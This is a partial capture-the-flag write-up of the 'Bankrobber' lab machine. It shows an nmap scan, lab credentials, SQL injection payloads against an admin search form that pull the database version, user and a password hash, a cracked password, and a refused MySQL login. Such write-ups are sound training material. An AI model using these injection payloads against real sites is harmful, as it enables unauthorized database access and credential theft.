# Bankrobber

- Difficulty: "Insane"
- Platform: Windows
---

10.10.10.154

## Nmap
```nmap
I wiped out disk without backing up notes like an idiot... 
picking up from web-admin access

The Rundown:

Esentially, there is a database user search and and E-Coin transfer service. 
The transfer service is manually reviewed by an administrator. 

The filed inputs do not validate/sanitize.
A cross-site scripting attack is possible, although finicky, returning the administrator's cookie within the response headers.

There seems to be SQL-Injection present in the user database lookup, although I have yet to go any further. I am conflating both these things together and I forget what I actually did ut oh well... continuing.

➜  Bankrobber git:(main) ✗ sudo nmap -oA nmap/found-TCP-detailed 
	-p$(cat nmap/allports-TCP-initial.nmap | grep open | awk '{ print $1 }' | awk '{ print $0+0}' | sed ':a;N;$!ba;s/\n/,/g') -sCV -T4 --min-rate 5000 -Pn 10.10.10.154
 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-30 02:53 EDT
Stats: 0:00:40 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.82% done; ETC: 02:54 (0:00:00 remaining)
Nmap scan report for 10.10.10.154
Host is up (0.027s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
443/tcp  open  ssl/http     Apache httpd 2.4.39 ((Win64) OpenSSL/1.1.1b PHP/7.3.4)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.39 (Win64) OpenSSL/1.1.1b PHP/7.3.4
|_http-title: E-coin
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB (unauthorized)
Service Info: Host: BANKROBBER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-07-30T06:54:01
|_  start_date: 2023-07-30T05:18:55

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 53.85 seconds
```

`admin:Hopelessromantic`

A regular union select statement reveals version `MariaDB-10.1.38` in field 2:`
```http
POST /admin/search.php HTTP/1.1
Host: 10.10.10.154
Content-Length: 37
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36
Content-type: application/x-www-form-urlencoded
Accept: */*
Origin: http://10.10.10.154
Referer: http://10.10.10.154/admin/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: id=1; username=YWRtaW4%3D; password=SG9wZWxlc3Nyb21hbnRpYw%3D%3D
Connection: close

term=1'union+select+1,@@version,3-- -
```

```
term=1'union+select+1,user()+from+mysql.user,3-- -
user: `root@localhost`

lucky guess:
term=1'union slect user,password,3 from mysql.user--
hash: *F435725A173757E57BD36B09048B8B610FF4D0C4
```

SHA-1 hash decodes to `Welkom1!`. This could be either admin or gio's password. Connections aren't permitted to the MySQL service from an external IP. Localhost only:
```bash
➜  loot git:(main) ✗ mysql -u 'gio' -p 'Welkom1!' -h 10.10.10.154
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Enter password: 

ERROR 1130 (HY000): Host '10.10.14.2' is not allowed to connect to this MariaDB server
```


